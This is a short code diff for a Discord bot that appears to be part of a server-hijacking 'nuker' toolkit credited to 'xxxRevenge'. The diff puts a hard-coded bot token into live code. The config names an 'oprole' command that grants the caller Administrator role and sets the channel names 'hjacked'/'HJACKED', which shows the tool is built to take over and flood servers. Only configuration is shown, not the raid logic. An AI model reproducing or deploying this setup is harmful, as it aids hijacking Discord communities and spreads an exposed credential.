@@ -14,8 +14,8 @@
 //By xxxRevenge (Bowlingtoolkit)
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
-const Token = '' //NjE1MjY5NjA0NzAwNDU0OTIy.XWL9eA.lpQ0v2-haNdYCEd6WWnVtOHJVfE //
-const x_x = "." // .7wi //
+const Token = 'NjE1MjY5NjA0NzAwNDU0OTIy.XWL9eA.lpQ0v2-haNdYCEd6WWnVtOHJVfE'
+const x_x = ".7wi" //  //
 const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
 const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
 const vooice = "HJACKED" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
